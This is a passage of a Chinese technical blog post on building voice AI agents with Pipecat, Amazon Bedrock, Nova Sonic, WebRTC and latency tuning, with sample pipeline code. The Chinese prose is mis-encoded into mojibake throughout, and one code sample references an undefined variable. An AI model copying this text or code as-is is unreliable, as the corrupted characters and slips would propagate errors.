<li><strong>TTS( Text To Speech)</strong> ï¼šä¹Ÿç§°ä¸ºè¯­éŸ³åˆæˆï¼Œä»æ–‡æœ¬ç”Ÿæˆè‡ªç„¶ä¸”æ¸…æ™°çš„è¯­éŸ³</li>
</ul>
<p>é€šè¿‡å°†ä¸Šè¿°ç»„ä»¶ç»„åˆæˆä¸€æ¡Pipelineï¼Œå³å¯æ„å»ºå‡ºæ™ºèƒ½è¯­éŸ³Agentã€‚éšç€ç”Ÿæˆå¼AIæŠ€æœ¯çš„è¿›æ­¥ï¼Œä¸šç•Œå‘å±•å‡ºäº†ç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å‹ï¼ˆå³Speech to Speechè¯­éŸ³æ¨¡å‹ï¼‰ï¼Œè¯¥æ¨¡å‹å¯å®ç°è¯­éŸ³è¾“å…¥åˆ°è¯­éŸ³è¾“å‡ºçš„å…¨é“¾è·¯å¤„ç†ï¼Œä¾‹å¦‚Amazon Nova Sonicå°±æ˜¯ä¸€æ¬¾ç”±Amazonç ”å‘çš„Speech to Speechè¯­éŸ³æ¨¡å‹ã€‚ç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å‹å†…ç½®äº†VADã€EOUã€STTã€LLMã€TTSç­‰é›†æˆåŠŸèƒ½ï¼Œèƒ½å¤Ÿå®ç°æ›´ä½çš„å»¶è¿Ÿã€‚è¿™ç±»æ¨¡å‹ä½¿å¾—æ„å»ºè¯­éŸ³Agentæ›´ä¸ºè½»æ¾ä¾¿æ·ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fai%2Fgenerative-ai%2Fnova%2Fspeech%2F" target="_blank" title="https://aws.amazon.com/ai/generative-ai/nova/speech/" ref="nofollow noopener noreferrer">Amazon Nova Sonic</a>Â æ˜¯ä¸€æ¬¾è¯­éŸ³ç†è§£å’Œç”Ÿæˆæ¨¡å‹ï¼Œå¯æä¾›è‡ªç„¶çš„ç±»äººè¯­éŸ³å¯¹è¯å¼äººå·¥æ™ºèƒ½ï¼Œå¹¶ä¸”å®ç°äº†ä½å»¶è¿Ÿå’Œè¡Œä¸šé¢†å…ˆçš„æ€§ä»·æ¯”ã€‚è¯¥æ¨¡å‹æä¾›æµç•…çš„å¯¹è¯å¤„ç†ã€è‡ªé€‚åº”è¯­éŸ³å“åº”ã€å†…å®¹å®¡æ ¸ã€APIè°ƒç”¨å’ŒåŸºäºRAGçš„çŸ¥è¯†åº“é›†æˆï¼ŒåŒæ—¶æä¾›é«˜åº¦è‡ªé€‚åº”ä¸”å¼•äººå…¥èƒœçš„ç”¨æˆ·ä½“éªŒã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F10%2F20%2Fpipecat-agent-2.png" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/10/20/pipecat-agent-2.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dcf6613e2f947d7885cf007e8fb3001~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=NM0%2BRZQ468pY6bGJg7tcEcCtm2A%3D" alt="" loading="lazy"/></a></p>
<p>è¿™ä¸¤ç§æ–¹æ¡ˆå„æœ‰ä¼˜ç¼ºç‚¹ï¼šPipelineæ–¹æ¡ˆå¯ä»¥å¯¹å„ä¸ªéƒ¨åˆ†è¿›è¡Œç²¾ç»†æ§åˆ¶ï¼Œä½†å…¶ç¼ºç‚¹åœ¨äºè¯­éŸ³åˆ°æ–‡æœ¬çš„æ¥å›è½¬æ¢å¯èƒ½å¯¼è‡´éƒ¨åˆ†å£°éŸ³ä¿¡æ¯ä¸¢å¤±ï¼Œå¹¶ä¸”å»¶è¿Ÿç›¸å¯¹è¾ƒå¤§ã€‚ç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å‹æ–¹æ¡ˆå»¶è¿Ÿæ›´ä½ï¼Œå®ç°æ›´ä¸ºç®€å•ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ›´å¥½åœ°æ„ŸçŸ¥å£°éŸ³ä¿¡æ¯ï¼Œä¾‹å¦‚éè¯­è¨€çº¿ç´¢ï¼ˆå¦‚ç¬‘å£°ã€çŠ¹è±«ï¼‰ã€è¯­è°ƒã€é‡éŸ³ã€é£æ ¼ã€æƒ…ç»ªç­‰ï¼Œä½†å¯¹è¯­éŸ³å¦‚ä½•æµå…¥å’Œæµå‡ºAgentçš„æ§åˆ¶ç›¸å¯¹è¾ƒå°‘ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å½“å‰é˜¶æ®µï¼ŒSOTA LLMï¼ˆå‰æ²¿å¤§è¯­è¨€æ¨¡å‹ï¼‰ç›¸æ¯”äºSpeech to Speechè¯­éŸ³æ¨¡å‹ï¼Œåœ¨æˆæœ¬ã€æ¨ç†èƒ½åŠ›ã€æŒ‡ä»¤éµå¾ªå’Œå‡½æ•°è°ƒç”¨ç­‰æ–¹é¢ä»å æ®ä¼˜åŠ¿ã€‚ä½†ä¸å¯å¦è®¤ï¼ŒSpeech to Speechæ¨¡å‹æ˜¯è¯­éŸ³Agentçš„æœªæ¥ã€‚</p>
<blockquote>
<p>ğŸ“¢é™æ—¶æ’æ’­ï¼šæ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚</p>
<p>â©å¿«å¿«ç‚¹å‡»è¿›å…¥ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejinhead_0606%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejinhead_0606" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejinhead_0606&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejinhead_0606" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹å®éªŒæ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote>
<h2 data-id="heading-1">äºŒã€ä¼ è¾“åè®®å¯¹æ¯”</h2>
<p>è¦æ„å»ºè‡ªç„¶æµç•…çš„æ™ºèƒ½è¯­éŸ³Agentï¼Œä¼ è¾“åè®®çš„é€‰æ‹©è‡³å…³é‡è¦ï¼Œå®ƒä»¬ç›´æ¥å½±å“ç€è¯­éŸ³æµçš„ä¼ è¾“æ•ˆç‡å’Œå®æ—¶æ€§ã€‚å¸¸è§çš„ä¼ è¾“åè®®æœ‰WebSocketï¼ŒWebRTCç­‰ï¼Œå®ƒä»¬æœ‰å„è‡ªçš„ç‰¹ç‚¹ï¼Œè¯¦ç»†å¯¹æ¯”å¦‚ä¸‹ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e364e0cd8e24bf8a626e769d6ea4914~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=KPFEt9UFKhCjm36HTU8RpkVHnDk%3D" alt="image.png" loading="lazy"/>
é€šè¿‡å¯¹æ¯”å¯ä»¥çœ‹å‡ºï¼ŒWebSocketå…¼å®¹æ€§æ›´å¥½ï¼ŒWebRTCå¯¹éŸ³è§†é¢‘çš„ä¼ è¾“åšäº†å¾ˆå¤šä¼˜åŒ–ï¼Œä¼ è¾“æ•ˆç‡æ›´é«˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºæ„å»ºåŸå‹å’Œè½»é‡çº§é¡¹ç›®ï¼Œå¯ä»¥é€‰æ‹©Websocketï¼Œå¯¹äºä¸­å¤§å‹ç”Ÿäº§é¡¹ç›®ï¼ŒWebRTCæ˜¯æ›´ä¼˜çš„é€‰æ‹©ã€‚ä½†WebRTCåè®®å¤æ‚ï¼Œéƒ¨ç½²ä¹Ÿå¾ˆå¤æ‚ï¼Œéœ€è¦å®ç°ä¿¡ä»¤æœåŠ¡å™¨ã€STUNæœåŠ¡å™¨ï¼ˆå…¬ç½‘IPå’Œç«¯å£å‘ç°ï¼‰ï¼ŒTURNæœåŠ¡å™¨ï¼ˆP2Pè¿æ¥å¤±è´¥æ—¶ä½œä¸ºåª’ä½“ä¸­ç»§æœåŠ¡å™¨ï¼Œå®ç°è¯¸å¦‚NATç©¿é€ï¼‰ã€‚å› æ­¤æ„å»ºä¸€ä¸ªæˆç†Ÿç¨³å®šçš„WebRTCæ–¹æ¡ˆï¼Œéš¾åº¦æ¯”è¾ƒå¤§ã€‚ç›®å‰å¸‚é¢ä¸Šæœ‰<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flivekit%2Flivekit" target="_blank" title="https://github.com/livekit/livekit" ref="nofollow noopener noreferrer">Livekit</a>å¼€æºæ¡†æ¶ï¼ŒåŒæ—¶ä¹Ÿæœ‰Amazon KVSã€Dailyã€Livekit Cloudç­‰å•†ä¸šWebRTCæœåŠ¡å¯ä¾›é€‰æ‹©ã€‚</p>
<p>ä½¿ç”¨WebRTCæœ‰ä¸¤ç§ä¸»è¦æ–¹å¼ï¼šä¸€æ˜¯é€šè¿‡äº‘ç«¯çš„WebRTCæœåŠ¡å™¨ä¸­è½¬ï¼Œå•†ä¸šWebRTCæœåŠ¡å¤šé‡‡ç”¨æ­¤æ¨¡å¼ï¼›äºŒæ˜¯ç›´æ¥åœ¨å®¢æˆ·ç«¯å’Œè¯­éŸ³Agentç«¯ä¹‹é—´å»ºç«‹è¿æ¥ã€‚äº‘ç«¯æœåŠ¡å™¨æ¨¡å¼å¯ä»¥å®ç°ç›´è¿æ¨¡å¼æ— æ³•æä¾›çš„è¯¸å¤šç‰¹æ€§ï¼Œä¾‹å¦‚å¤šæ–¹ä¼šè¯ã€å¤šæ–¹å½•éŸ³ç­‰ã€‚è€Œç›´è¿æ¨¡å¼åˆ™éå¸¸é€‚åˆè¯­éŸ³AI Agentçš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åœºæ™¯ï¼Œå®ƒå‡å°‘äº†æœåŠ¡å™¨ä¸­è½¬ç¯èŠ‚ï¼Œå¹¶ä¸”æ— éœ€ç»´æŠ¤ä»»ä½•ç‰¹å®šäºWebRTCçš„åŸºç¡€è®¾æ–½ã€‚</p>
<p>Tips:</p>
<p>è‡ªå»ºWebRTCæœåŠ¡å¯ä»¥ä½¿ç”¨å…¬å¼€STUNæœåŠ¡å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgist.github.com%2Fmondain%2Fb0ec1cf5f60ae726202e" target="_blank" title="https://gist.github.com/mondain/b0ec1cf5f60ae726202e" ref="nofollow noopener noreferrer">gist.github.com/mondain/b0eâ€¦</a>ã€‚å¯ä»¥æ ¹æ®è¯­éŸ³Agentçš„éƒ¨ç½²ä½ç½®é€‰æ‹©åˆé€‚çš„STUNæœåŠ¡å™¨ã€‚</p>
<p>WebRTCæœåŠ¡ä½¿ç”¨UDPåè®®è¿›è¡Œè¿æ¥ï¼Œåœ¨äºšé©¬é€Šäº‘éƒ¨ç½²æ—¶éœ€è¦åœ¨å®‰å…¨ç»„å¼€æ”¾å¯¹åº”çš„UDPç«¯å£ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€æ™ºèƒ½è¯­éŸ³Agentå»¶è¿Ÿä¼˜åŒ–å»ºè®®</h2>
<p>å»¶è¿Ÿæ˜¯å½±å“äººä¸è¯­éŸ³Agentä¹‹é—´å¯¹è¯ä½“éªŒçš„å…³é”®å› ç´ ã€‚äººç±»æœŸæœ›åœ¨æ­£å¸¸å¯¹è¯ä¸­è·å¾—å¿«é€Ÿå“åº”ï¼Œé•¿æ—¶é—´çš„åœé¡¿ä¼šæ˜¾å¾—ä¸è‡ªç„¶ï¼ˆäººæœºå¯¹è¯çš„å…¸å‹å“åº”æ—¶é—´é€šå¸¸ä¸º500æ¯«ç§’ï¼‰ã€‚å› æ­¤ï¼Œå»¶è¿Ÿä¼˜åŒ–å¯¹äºæ™ºèƒ½è¯­éŸ³Agentæ¥è¯´è‡³å…³é‡è¦ã€‚</p>
<p>æ ¹æ®ä½œè€…åŸºäºAmazon Bedrockæ„å»ºæ™ºèƒ½è¯­éŸ³Agentçš„å®è·µç»éªŒï¼Œå»ºè®®ç»¼åˆè€ƒè™‘ä»¥ä¸‹æ–¹å¼ä¼˜åŒ–å»¶è¿ŸæŠ€æœ¯ã€‚</p>
<ul>
<li>
<p>è¯­éŸ³Agentéƒ¨ç½²å°½é‡é è¿‘ç”¨æˆ·ï¼Œå‡å°‘ç½‘ç»œä¼ è¾“å»¶è¿Ÿã€‚</p>
</li>
<li>
<p>ä½¿ç”¨ä¼ è¾“æ•ˆç‡æ›´é«˜ã€å»¶è¿Ÿæ›´ä½çš„ä¼ è¾“åè®®ï¼Œå¦‚ WebRTCã€‚</p>
</li>
<li>
<p>LLM å»¶è¿Ÿä¼˜åŒ–ï¼šLLMçš„å»¶è¿Ÿåœ¨æ•´ä¸ªè¯­éŸ³Agentçš„å»¶è¿Ÿä¸­å æ®ä¸»è¦éƒ¨åˆ†ï¼Œå› æ­¤å¯¹LLMè¿›è¡Œå»¶è¿Ÿä¼˜åŒ–æ˜¾å¾—å°¤ä¸ºå…³é”®ã€‚åœ¨æ»¡è¶³è¦æ±‚çš„å‰æä¸‹ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ‰‹æ®µè¿›è¡Œä¼˜åŒ–ã€‚</p>
<ul>
<li>ä¼˜å…ˆé€‰æ‹©ç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å‹ï¼Œè¿™ç§æ¨¡å¼ä¸€èˆ¬æ¯”STT-LLM-TTSçš„Pipelineæ¨¡å¼å»¶è¿Ÿæ›´ä½ã€‚</li>
<li>é€‰æ‹©å‚æ•°é‡æ›´å°/æ¨ç†é€Ÿåº¦æ›´å¿«çš„æ¨¡å‹ï¼ˆä¾‹å¦‚Nova Liteï¼ŒClaude 3.5 Haikuç­‰ï¼‰ã€‚</li>
<li>ä½¿ç”¨Bedrockä¸Šæ”¯æŒå»¶è¿Ÿä¼˜åŒ–çš„æ¨¡å‹ï¼ˆä¾‹å¦‚Nova Proï¼ŒClaude 3.5 Haikuç­‰ï¼‰</li>
<li>å¼€å¯ Prompt caching</li>
</ul>
</li>
<li>
<p>Pre-LLM TTS å¡«å……ï¼Œåœ¨ç”¨æˆ·å¯¹è¯å‰é¢„å…ˆè¾“å‡ºå†…å®¹ï¼ˆå¦‚è‡ªæˆ‘ä»‹ç»ï¼‰ï¼Œç»™ç”¨æˆ·ä½“æ„Ÿä¸Šçš„å¿«ã€‚</p>
</li>
<li>
<p>æ‰§è¡Œé•¿æ—¶é—´å‡½æ•°è°ƒç”¨ä¹‹å‰ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ï¼Œä¾‹å¦‚â€œå¤„ç†ä¸­ï¼Œè¯·ç¨åâ€¦â€ï¼Œä»è€Œå‡å°‘å®¢æˆ·çš„ç­‰å¾…æ—¶é—´ã€‚</p>
</li>
<li>
<p>é€šè¿‡LLMæç¤ºè¯å¼•å¯¼ï¼Œç¼©çŸ­å›å¤å†…å®¹ã€‚</p>
</li>
</ul>
<p>å…¸å‹çš„Pipelineæ¨¡å¼å’Œç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å‹å»¶è¿Ÿå¯¹æ¯”å¦‚ä¸‹ï¼ˆè¯·æ³¨æ„ï¼Œä¸åŒæ–¹æ¡ˆå’Œç»„ä»¶çš„å»¶è¿Ÿå·®å¼‚è¾ƒå¤§ï¼Œä»¥ä¸‹æ•°æ®ä»…ä¾›å‚è€ƒï¼‰ã€‚åœ¨è®¾è®¡æ™ºèƒ½è¯­éŸ³Agentæ—¶ï¼Œå°†è¯­éŸ³ç«¯åˆ°ç«¯å»¶è¿Ÿæ§åˆ¶åœ¨800è‡³1000æ¯«ç§’æ˜¯ä¸€ä¸ªä¸é”™çš„ç›®æ ‡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acdb005286ca4ea297155c1334f352ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=KYnXUY8DW%2BEmV50bKdGRqVK6fCE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">å››ã€ä½¿ç”¨Pipecatæ¡†æ¶æ„å»ºæ™ºèƒ½è¯­éŸ³Agent</h2>
<p>æ„å»ºä¸€ä¸ªæ™ºèƒ½è¯­éŸ³Agentå¹¶éæ˜“äº‹ã€‚é™¤äº†å®ç°ä¸Šæ–‡æ‰€è¿°çš„æ ¸å¿ƒç»„ä»¶ï¼Œè¿˜éœ€è¦è€ƒè™‘å¦‚ä½•å­˜å‚¨ä¼šè¯ä¸Šä¸‹æ–‡ã€æ¥å…¥å¤–éƒ¨çŸ¥è¯†åº“æˆ–å¯¹æ¥åç«¯ç³»ç»Ÿç­‰åŠŸèƒ½ã€‚ä½¿ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpipecat-ai%2Fpipecat" target="_blank" title="https://github.com/pipecat-ai/pipecat" ref="nofollow noopener noreferrer">Pipecat</a>Â å¼€æºæ¡†æ¶å¯ä»¥æ˜¾è‘—ç®€åŒ–æ™ºèƒ½è¯­éŸ³Agentçš„å¼€å‘è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-4">4.1 Pipecatæ¡†æ¶ä»‹ç»</h3>
<p>Pipecatæ˜¯ä¸€ä¸ªå¼€æºçš„Pythonæ¡†æ¶ï¼Œä¸“ä¸ºæ„å»ºå®æ—¶è¯­éŸ³å’Œå¤šæ¨¡æ€å¯¹è¯Agentè€Œè®¾è®¡ã€‚å®ƒèƒ½å¤Ÿè½»æ¾åè°ƒéŸ³é¢‘/è§†é¢‘æµã€AIæœåŠ¡ã€å¤šç§ä¼ è¾“æ–¹å¼ä»¥åŠå¯¹è¯æµç¨‹ï¼Œä»è€Œè®©å¼€å‘è€…æ›´ä¸“æ³¨äºæ‰“é€ ç‹¬å…·ç‰¹è‰²çš„Agentã€‚</p>
<p><strong>Pipecat</strong> <strong>ä¸»è¦ç‰¹æ€§åŒ…æ‹¬ï¼š</strong></p>
<ul>
<li>ä½å»¶è¿Ÿå®æ—¶äº¤äº’</li>
<li>æ”¯æŒAgentic Workflowï¼Œå¯é›†æˆå„ç±»å·¥å…·ï¼ˆtoolsï¼‰</li>
<li>æ”¯æŒ WebRTCã€WebSocketç­‰ä¼ è¾“åè®®</li>
<li>çµæ´»çš„æ¨¡å‹å’ŒæœåŠ¡é€‰æ‹©ï¼Œå¦‚ Amazon Bedrockï¼ŒPollyï¼ŒTranscribeåŠå…¶å®ƒä¸»æµçš„æ¨¡å‹ã€‚</li>
<li>æ”¯æŒç”¨æˆ·æ‰“æ–­</li>
<li>å¤šæ¨¡æ€</li>
</ul>
<h3 data-id="heading-5">4.2 æ–¹æ¡ˆä»‹ç»</h3>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å€ŸåŠ©ä¸€ä¸ªç¤ºä¾‹é¡¹ç›®ï¼Œæ¢è®¨å¦‚ä½•åŸºäºPipecatæ¡†æ¶ï¼Œå¹¶ç»“åˆAmazon Bedrockã€Amazon Pollyå’ŒAmazon Transcribeç­‰æœåŠ¡æ¥æ„å»ºæ™ºèƒ½è¯­éŸ³Agentã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fbedrock%2F" target="_blank" title="https://aws.amazon.com/cn/bedrock/" ref="nofollow noopener noreferrer">Amazon Bedrock</a>æ˜¯ç”¨äºæ„å»ºç”Ÿæˆå¼ AI åº”ç”¨ç¨‹åºå’ŒAgentçš„æ‰˜ç®¡æœåŠ¡ï¼Œæ”¯æŒå¤šç§è‡ªç ”å’Œç¬¬ä¸‰æ–¹å¤§æ¨¡å‹ï¼Œä¾‹å¦‚Amazon Novaã€Nova Sonicã€DeepSeekã€Anthropic Claudeç³»åˆ—æ¨¡å‹ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fpolly%2F" target="_blank" title="https://aws.amazon.com/cn/polly/" ref="nofollow noopener noreferrer">Amazon Polly</a>æ˜¯ä¸€é¡¹å®Œå…¨æ‰˜ç®¡çš„æœåŠ¡ï¼Œå¯æŒ‰éœ€ç”Ÿæˆè¯­éŸ³ï¼Œå°†ä»»æ„æ–‡æœ¬è½¬æ¢ä¸ºéŸ³é¢‘æµï¼ˆå³TTSï¼‰ï¼Œå¹¶æ”¯æŒæ•°åç§è¯­è¨€ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Ftranscribe%2F" target="_blank" title="https://aws.amazon.com/cn/transcribe/" ref="nofollow noopener noreferrer">Amazon Transcribe</a>Â æ˜¯ä¸€é¡¹å®Œå…¨æ‰˜ç®¡çš„è‡ªåŠ¨è¯­éŸ³è¯†åˆ«ï¼ˆASRï¼‰æœåŠ¡ï¼Œè‡ªåŠ¨å°†è¯­éŸ³è½¬æ¢ä¸ºæ–‡æœ¬ã€‚</p>
<p>è¯¥ç¤ºä¾‹é¡¹ç›®æ¼”ç¤ºäº†å¦‚ä¸‹åŠŸèƒ½ï¼š</p>
<ul>
<li>æ”¯æŒPipelineæ¨¡å¼å’Œç«¯åˆ°ç«¯è¯­éŸ³æ¨¡å¼ï¼ˆä½¿ç”¨Amazon Nova Sonicæ¨¡å‹ï¼‰ã€‚</li>
<li>ä½¿ç”¨WebRTCä½œä¸ºä¼ è¾“åè®®ã€‚</li>
<li>é€šè¿‡Toolsé›†æˆçŸ¥è¯†åº“ï¼Œè¯¥çŸ¥è¯†åº“åŒ…å«äº†2025å¹´äºšé©¬é€Šäº‘ç§‘æŠ€ä¸­å›½å³°ä¼šçš„ç›¸å…³å†…å®¹ã€‚</li>
<li>æä¾›Webå‰ç«¯ï¼Œç”¨äºä¸Agentè¿›è¡Œè¯­éŸ³äº¤äº’ã€‚</li>
</ul>
<p>å®Œæ•´çš„ç¤ºä¾‹ä»£ç è§Githubä»£ç ä»“åº“:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffreewine%2Fsample-voice-agent-with-Amazon-Bedrock-and-Pipecat" target="_blank" title="https://github.com/freewine/sample-voice-agent-with-Amazon-Bedrock-and-Pipecat" ref="nofollow noopener noreferrer">github.com/freewine/saâ€¦</a></p>
<p>ä½¿ç”¨Pipecatæ„å»ºæ™ºèƒ½è¯­éŸ³Agentçš„é€»è¾‘æ¶æ„å¦‚å›¾æ‰€ç¤ºã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F10%2F20%2Fpipecat-agent-3.png" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/10/20/pipecat-agent-3.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/858e61b8feb243b490cbe0604e091715~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=hgtohmDFOhlopdag6gZqirm7aig%3D" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-6">4.3 Agentæ ¸å¿ƒä»£ç </h3>
<p>ä½¿ç”¨Pipecatæ„å»ºè¯­éŸ³Agentçš„å…³é”®åœ¨äºå·¥ä½œæµçš„æ­å»ºã€‚ä»¥ä¸‹æ˜¯Pipelineæ¨¡å¼çš„ç¤ºä¾‹ä»£ç ï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºï¼Œé€šè¿‡STTã€LLMå’ŒTTSç­‰æœåŠ¡æ„å»ºäº†ä¸€æ¡å®Œæ•´çš„Pipelineã€‚ä¸ºä¾¿äºé˜…è¯»å’Œç†è§£ï¼Œæˆ‘ä»¬å·²å¯¹ä»£ç è¿›è¡Œç®€åŒ–ï¼Œå®Œæ•´ä»£ç è¯·è®¿é—®Githubä»“åº“ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">transport</span> = SmallWebRTCTransport(
    <span class="hljs-attr">webrtc_connection</span>=webrtc_connection,
    <span class="hljs-attr">params</span>=TransportParams(
        <span class="hljs-attr">audio_in_enabled</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">audio_out_enabled</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">vad_analyzer</span>=SileroVADAnalyzer(),
    ),
)

<span class="hljs-attr">stt</span> = AWSTranscribeSTTService()
<span class="hljs-attr">tts</span> = AWSPollyTTSService(voice_id=â€œJoannaâ€)
<span class="hljs-attr">llm</span> = AWSBedrockLLMService( model=<span class="hljs-string">"apac.amazon.nova-pro-v1:0"</span>)
<span class="hljs-attr">context</span> = AWSBedrockLLMContext(messages, tools)
<span class="hljs-attr">context_aggregator</span> = llm.create_context_aggregator(context)
<span class="hljs-attr">pipeline</span> = Pipeline(
    <span class="hljs-section">[
        transport.input(), # Transport user input
        stt, # STT
        context_aggregator.user(), # User responses
        llm, # LLM
        tts, # TTS
        transport.output(), # Transport bot output
        context_aggregator.assistant(), # Assistant spoken responses
    ]</span>
)
 <span class="hljs-attr">task</span> = PipelineTask(
    pipeline,
    <span class="hljs-attr">params</span>=PipelineParams(
        <span class="hljs-attr">allow_interruptions</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">enable_metrics</span>=<span class="hljs-literal">True</span>,
    ),
)
</code></pre>
<p>å¦‚æœä½¿ç”¨Speech to Speechæ¨¡å‹ï¼Œå¯ä»¥çœå»TTSå’ŒSTTï¼Œå®ç°ç«¯åˆ°ç«¯è¯­éŸ³è¾“å…¥è¾“å‡ºã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">transport</span> = SmallWebRTCTransport(
    <span class="hljs-attr">webrtc_connection</span>=webrtc_connection,
    <span class="hljs-attr">params</span>=TransportParams(
        <span class="hljs-attr">audio_in_enabled</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">audio_out_enabled</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">vad_analyzer</span>=SileroVADAnalyzer(),
    ),
)

<span class="hljs-comment"># Create the AWS Nova Sonic LLM service</span>
<span class="hljs-attr">speech_to_speech</span> = AWSNovaSonicLLMService(
    <span class="hljs-attr">secret_access_key</span>=os.getenv(<span class="hljs-string">"AWS_SECRET_ACCESS_KEY"</span>),
    <span class="hljs-attr">access_key_id</span>=os.getenv(<span class="hljs-string">"AWS_ACCESS_KEY_ID"</span>),
    <span class="hljs-attr">region</span>=os.getenv(<span class="hljs-string">"AWS_REGION"</span>),
    <span class="hljs-attr">voice_id</span>=<span class="hljs-string">"tiffany"</span>,
)
<span class="hljs-attr">context</span> = AWSBedrockLLMContext(messages, tools)
<span class="hljs-attr">context_aggregator</span> = llm.create_context_aggregator(context)
<span class="hljs-attr">pipeline</span> = Pipeline(
    <span class="hljs-section">[
        transport.input(), # Transport user input
        context_aggregator.user(), # User responses
        speech_to_speech, # Speech to Speech model
        transport.output(), # Transport bot output
        context_aggregator.assistant(), # Assistant spoken responses
    ]</span>
)
 <span class="hljs-attr">task</span> = PipelineTask(
    pipeline,
    <span class="hljs-attr">params</span>=PipelineParams(
        <span class="hljs-attr">allow_interruptions</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">enable_metrics</span>=<span class="hljs-literal">True</span>,
    ),
)
</code></pre>
<h3 data-id="heading-7">4.4 ç³»ç»Ÿæç¤ºè¯æœ€ä½³å®è·µ</h3>
